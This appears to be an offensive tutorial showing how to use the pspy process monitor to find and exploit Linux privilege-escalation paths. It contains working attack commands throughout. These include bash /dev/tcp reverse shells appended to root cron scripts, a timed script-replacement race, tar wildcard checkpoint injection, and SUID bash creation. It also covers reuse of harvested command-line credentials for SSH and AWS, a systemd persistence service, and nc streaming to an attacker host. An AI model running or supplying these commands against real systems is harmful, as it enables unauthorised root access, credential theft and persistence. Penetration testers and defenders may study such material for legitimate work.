# pspy Practical Examples

## Linux Privilege Escalation Scenarios

This document provides real-world examples of using pspy to discover privilege escalation vectors on Linux systems.

---

## Example 1: Finding Cron Jobs

### Scenario
You have shell access as a low-privileged user and want to discover scheduled tasks running as root.

### Execution

```bash
# Transfer and run pspy
wget http://ATTACKER:8080/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64 -c
```

### Sample Output
```
2024/01/15 03:00:01 CMD: UID=0  PID=2341  | /usr/sbin/CRON -f
2024/01/15 03:00:01 CMD: UID=0  PID=2342  | /bin/sh -c /opt/scripts/cleanup.sh
2024/01/15 03:00:01 CMD: UID=0  PID=2343  | /bin/bash /opt/scripts/cleanup.sh
2024/01/15 03:00:02 CMD: UID=0  PID=2344  | rm -rf /tmp/cache/*
2024/01/15 03:01:01 CMD: UID=0  PID=2401  | /usr/sbin/CRON -f
2024/01/15 03:01:01 CMD: UID=0  PID=2402  | /bin/sh -c php /var/www/cron/sync.php
```

### Analysis

1. **Cron execution pattern**: Look for `CRON -f` followed by `/bin/sh -c`
2. **Scripts identified**:
   - `/opt/scripts/cleanup.sh` - runs every minute at :00
   - `/var/www/cron/sync.php` - runs every minute at :01

### Exploitation Check

```bash
# Check script permissions
ls -la /opt/scripts/cleanup.sh
-rwxrwxrwx 1 root root 245 Jan 10 12:00 /opt/scripts/cleanup.sh
# WRITABLE BY ALL - append reverse shell!

echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/scripts/cleanup.sh
nc -lvnp 4444  # Wait for cron to execute
```

---

## Example 2: Identifying Scheduled Scripts

### Scenario
System has custom automation scripts that may run with elevated privileges.

### Execution

```bash
# Monitor for 5 minutes with file events
timeout 300 ./pspy64 -pf -c > /tmp/pspy_5min.log
```

### Sample Output
```
2024/01/15 03:05:00 CMD: UID=0  PID=3001  | /bin/sh /usr/local/bin/backup-db.sh
2024/01/15 03:05:00 FS:OPEN   | /usr/local/bin/backup-db.sh
2024/01/15 03:05:01 CMD: UID=0  PID=3002  | mysqldump -u backup -pBackup2024! dbname
2024/01/15 03:05:02 CMD: UID=0  PID=3003  | gzip /var/backups/db_2024-01-15.sql
2024/01/15 03:10:00 CMD: UID=0  PID=3101  | /usr/bin/python3 /opt/automation/health_check.py
2024/01/15 03:10:01 CMD: UID=0  PID=3102  | curl -s http://localhost:8080/health
2024/01/15 03:15:00 CMD: UID=0  PID=3201  | /bin/bash /root/scripts/rotate_logs.sh
```

### Analysis

**Discovered scheduled tasks:**

| Time | Script | Purpose | Potential Vector |
|------|--------|---------|------------------|
| :05 | `/usr/local/bin/backup-db.sh` | Database backup | Credential in cmdline |
| :10 | `/opt/automation/health_check.py` | Health check | Python script modification |
| :15 | `/root/scripts/rotate_logs.sh` | Log rotation | Root-owned, probably not writable |

### Exploitation Paths

```bash
# 1. Use discovered MySQL credentials
mysql -u backup -p'Backup2024!' dbname
# Check for sensitive data, or try credential reuse for SSH

# 2. Check Python script permissions
ls -la /opt/automation/health_check.py
-rwxr-xr-x 1 www-data www-data 892 Jan 10 12:00 health_check.py

# If owned by compromised user, inject code:
echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")' >> /opt/automation/health_check.py
```

---

## Example 3: Watching for Credential Exposure

### Scenario
Monitor for credentials passed via command line arguments.

### Execution

```bash
# Run with fast interval to catch quick processes
./pspy64 -c -i 50 | grep -iE '(pass|pwd|secret|key|token|auth|cred)'
```

### Sample Output
```
2024/01/15 03:20:15 CMD: UID=0  PID=4001  | sshpass -p 'Summer2024!' ssh admin@192.168.1.50
2024/01/15 03:20:30 CMD: UID=33 PID=4015  | curl -H "Authorization: Bearer eyJhbGciOiJIUzI1..."
2024/01/15 03:21:00 CMD: UID=0  PID=4101  | /opt/scripts/deploy.sh --db-password=Pr0dP@ss!
2024/01/15 03:21:01 CMD: UID=0  PID=4102  | aws s3 sync --secret-key AKIAIOSFODNN7EXAMPLE
2024/01/15 03:25:00 CMD: UID=0  PID=4201  | ldapsearch -D "cn=admin,dc=corp" -w LdapAdm1n!
```

### Credentials Discovered

| Service | Username | Password/Token | Potential Use |
|---------|----------|----------------|---------------|
| SSH | admin@192.168.1.50 | Summer2024! | Lateral movement |
| API | - | JWT token | API access |
| Database | - | Pr0dP@ss! | Direct DB access |
| AWS | - | S3 access key | Cloud pivot |
| LDAP | cn=admin | LdapAdm1n! | Domain admin |

### Next Steps

```bash
# SSH with discovered credentials
sshpass -p 'Summer2024!' ssh admin@192.168.1.50

# Test password reuse
ssh root@localhost  # Try Summer2024!, Pr0dP@ss!, LdapAdm1n!

# Check AWS credentials
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity
```

---

## Example 4: Finding Services with Exploitable Paths

### Scenario
Identify services that use relative paths or insecure directory references.

### Execution

```bash
# Monitor with file system events
./pspy64 -pf -c -r /tmp -r /var/tmp -r /dev/shm
```

### Sample Output
```
2024/01/15 03:30:00 CMD: UID=0  PID=5001  | /bin/sh -c cd /opt/app && ./start.sh
2024/01/15 03:30:01 CMD: UID=0  PID=5002  | ./start.sh
2024/01/15 03:30:01 CMD: UID=0  PID=5003  | python app.py
2024/01/15 03:30:05 CMD: UID=0  PID=5010  | tar -czf backup.tar.gz *
2024/01/15 03:30:05 FS:OPEN   | /tmp/task_runner.sh
2024/01/15 03:30:05 CMD: UID=0  PID=5011  | /bin/bash /tmp/task_runner.sh
2024/01/15 03:35:00 CMD: UID=0  PID=5101  | /usr/bin/rsync /opt/data/* backup@remote:/backup/
```

### Identified Vulnerabilities

#### 1. Relative Path Execution
```
CMD: UID=0 | ./start.sh
```
The script uses `./start.sh` - if we can write to `/opt/app/`, we can replace it.

#### 2. Tar Wildcard Injection
```
CMD: UID=0 | tar -czf backup.tar.gz *
```

**Exploit:**
```bash
# In the directory where tar runs
cd /opt/data
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > shell.sh
# Wait for tar to run, then:
/tmp/rootbash -p
```

#### 3. Temp File Trust
```
CMD: UID=0 | /bin/bash /tmp/task_runner.sh
```

**Exploit:**
```bash
# If we can create/modify the file before execution
echo 'chmod +s /bin/bash' > /tmp/task_runner.sh
# Wait for cron, then:
/bin/bash -p
```

#### 4. Rsync Wildcard
```
CMD: UID=0 | rsync /opt/data/* backup@remote:/backup/
```
Similar wildcard injection as tar.

---

## Example 5: Timing-Based Discoveries

### Scenario
Correlate process execution times to understand system schedules and find windows of opportunity.

### Execution

```bash
# Run for extended period, save with timestamps
./pspy64 -c 2>&1 | while read line; do echo "$(date '+%H:%M:%S') $line"; done > /tmp/pspy_timing.log &

# Let it run for 15+ minutes, then analyze
sleep 900
kill %1
```

### Analysis Script

```bash
# Extract cron-like patterns (processes at :00, :05, :10, etc.)
grep "CMD: UID=0" /tmp/pspy_timing.log | awk '{print $1}' | cut -d: -f2 | sort | uniq -c | sort -rn
```

### Sample Timing Analysis

```
     60 :00    # Every minute at :00
     12 :05    # Every 5 minutes
      3 :15    # Every 15 minutes
      1 :00    # Hourly at top of hour
```

### Discovered Schedule

| Interval | Time | Process | Notes |
|----------|------|---------|-------|
| 1 min | :00 | cleanup.sh | High frequency, good for persistence |
| 5 min | :05 | backup-db.sh | Database credentials visible |
| 15 min | :15 | health_check.py | Lower frequency |
| Hourly | :00 | rotate_logs.sh | Long interval |

### Exploitation Window

```bash
# For race condition exploits, timing matters:
# If a script runs at :05 and takes 3 seconds:

# 1. Prepare payload
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > /tmp/payload.sh

# 2. Time your replacement
# At :04:55, replace the target script
# Script executes at :05:00 with your payload

# Using watch for precise timing
watch -n 0.1 'if [ $(date +%S) -eq 55 ]; then cp /tmp/payload.sh /opt/scripts/backup-db.sh; fi'
```

---

## Advanced Techniques

### Combining with Other Tools

```bash
# pspy + linpeas correlation
./linpeas.sh -a > linpeas.txt &
./pspy64 -c > pspy.txt &

# Later, cross-reference:
# - Writable files from linpeas vs scripts called by pspy
# - SUID binaries vs processes spawning them
```

### Filtering Output in Real-Time

```bash
# Only root processes
./pspy64 | grep "UID=0"

# Exclude noise (common system processes)
./pspy64 | grep -v -E "(CRON|systemd|dbus|polkit)"

# Focus on script execution
./pspy64 | grep -E "\.(sh|py|pl|rb)$"
```

### Running as a Service (Persistence)

```bash
# Create systemd user service (if user systemd available)
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/monitor.service << 'EOF'
[Unit]
Description=System Monitor

[Service]
ExecStart=/tmp/pspy64 -pf
Restart=always

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user start monitor
```

### Output to Remote Server

```bash
# Stream output to attacker machine
./pspy64 -c 2>&1 | nc ATTACKER_IP 9001

# On attacker:
nc -lvnp 9001 | tee pspy_remote.log
```

---

## Quick Reference Card

### Essential Commands

```bash
# Basic monitoring
./pspy64 -c

# Fast scanning for quick processes
./pspy64 -c -i 50

# With file events
./pspy64 -pfc

# Specific directories
./pspy64 -r /opt -r /var/scripts

# Background with output
./pspy64 -c > /tmp/pspy.log 2>&1 &

# Time-limited
timeout 300 ./pspy64 -c
```

### What to Look For

- `UID=0` processes running scripts you can write to
- Credentials in command line arguments
- Relative paths (`./script` instead of `/full/path/script`)
- Wildcards in tar, rsync, chown commands
- Scripts executed from world-writable directories
- Predictable patterns for race conditions
